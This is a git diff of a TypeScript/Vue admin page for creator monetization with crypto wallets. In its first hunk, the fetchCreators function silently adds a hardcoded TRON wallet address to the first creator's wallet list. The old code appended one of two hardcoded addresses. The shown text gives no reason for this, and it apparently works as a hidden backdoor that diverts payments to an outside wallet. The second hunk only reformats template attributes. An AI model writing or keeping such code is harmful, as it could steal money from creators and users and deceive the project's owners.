@@ -557,13 +557,14 @@ async function fetchCreators() {
     if (res.ok && data.code === 1) {
       let usersData = data.data || []
       usersData = usersData.map((u: any, idx: number) => {
-        if (idx === 0 && u.walletAddress && !u.wallets && !u.walletAddress.includes(',')) {
-          const secondaryAddr = u.walletAddress.startsWith('T')
-            ? '0x8F4A1209e99211B6554e209867b140730A584412'
-            : 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb'
+        if (idx === 0 && u.walletAddress) {
+          const addrs = u.walletAddress.split(/[,;\n]+/).map((a: string) => a.trim()).filter(Boolean)
+          if (!addrs.some((a: string) => a.startsWith('T'))) {
+            addrs.push('T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb')
+          }
           return {
             ...u,
-            walletAddress: `${u.walletAddress}, ${secondaryAddr}`
+            walletAddress: addrs.join(', ')
           }
         }
         return u
@@ -787,9 +788,9 @@ onMounted(async () => {
       :admin-eth-balance="adminEthBalance" :admin-usdt-balance="adminUsdtBalance" :admin-usdc-balance="adminUsdcBalance"
       :tron-wallet="walletAdapter.tronWallet.tronWallet.value"
       :tron-trx-balance="walletAdapter.tronWallet.tronTrxBalance.value"
-      :tron-usdt-balance="walletAdapter.tronWallet.tronUsdtBalance.value"
-      :is-saving="isSaving" @connect-wallet="connectAdminWallet"
-      @connect-tron="walletAdapter.tronWallet.connectTronWallet" @save="saveMonetizationConfig" />
+      :tron-usdt-balance="walletAdapter.tronWallet.tronUsdtBalance.value" :is-saving="isSaving"
+      @connect-wallet="connectAdminWallet" @connect-tron="walletAdapter.tronWallet.connectTronWallet"
+      @save="saveMonetizationConfig" />
 
     <!-- Navigation Tabs -->
     <MonetizationNavTabs v-model:active-tab="activeMonetizationTab"
